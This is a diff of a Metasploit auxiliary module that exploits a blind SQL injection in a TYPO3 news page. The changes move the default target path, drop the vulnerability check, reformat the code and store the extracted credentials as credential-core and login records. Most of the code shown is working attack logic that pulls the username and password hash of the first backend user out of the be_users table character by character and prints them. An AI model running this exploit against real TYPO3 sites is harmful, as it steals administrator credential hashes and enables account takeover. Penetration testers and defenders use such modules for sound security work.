@@ -45,20 +45,11 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('TARGETURI', [true, 'The path of TYPO3', '/typo3/']),
+        OptString.new('TARGETURI', [true, 'The path of TYPO3', '/']),
         OptString.new('ID', [true, 'The id of TYPO3 news page', '1']),
         OptString.new('PATTERN1', [false, 'Pattern of the first article title', 'Article #1']),
         OptString.new('PATTERN2', [false, 'Pattern of the second article title', 'Article #2'])
       ])
-  end
-
-  def check
-    # the only way to test if the target is vuln
-    if test_injection
-      return Exploit::CheckCode::Vulnerable
-    else
-      return Exploit::CheckCode::Safe
-    end
   end
 
   def dump_the_hash(patterns = {})
@@ -66,41 +57,45 @@ class MetasploitModule < Msf::Auxiliary
     ascii_charset_upper = "A".upto("Z").to_a.join('')
     ascii_charset = "#{ascii_charset_lower}#{ascii_charset_upper}"
     digit_charset = "0".upto("9").to_a.join('')
-    full_charset = "#{ascii_charset_lower}#{ascii_charset_upper}#{digit_charset}$./"
+    full_charset = "#{ascii_charset}#{digit_charset}$./"
+
     username = blind('username','be_users', 'uid=1', ascii_charset, digit_charset, patterns)
     print_good("Username: #{username}")
     password = blind('password','be_users', 'uid=1', full_charset, digit_charset, patterns)
     print_good("Password Hash: #{password}")
+
     connection_details = {
             module_fullname: self.fullname,
             username: username,
             private_data: password,
             private_type: :nonreplayable_hash,
-            status: Metasploit::Model::Login::Status::UNTRIED,
-        }.merge(service_details)
-    create_credential(connection_details)
+            workspace_id: myworkspace_id
+        }.merge!(service_details)
+    credential_core = create_credential(connection_details)
+    login_data = {
+        core: credential_core,
+        status: Metasploit::Model::Login::Status::UNTRIED,
+        workspace_id: myworkspace_id
+    }.merge(service_details)
+    create_credential_login(login_data)
   end
 
   def blind(field, table, condition, charset, digit_charset, patterns = {})
     # Adding 9 so that the result has two digits, If the lenght is superior to 100-9 it won't work
     offset = 9
-    size = blind_size(
-     "length(#{field})+#{offset}",
-     table,
-     condition,
-     2,
-     digit_charset,
-     patterns
-    )
+    size = blind_size("length(#{field})+#{offset}",
+                      table,
+                      condition,
+                      2,
+                      digit_charset,
+                      patterns)
     size = size.to_i - offset
-    data = blind_size(
-     field,
-     table,
-     condition,
-     size,
-     charset,
-     patterns
-    )
+    data = blind_size(field,
+                      table,
+                      condition,
+                      size,
+                      charset,
+                      patterns)
     return data
   end
 
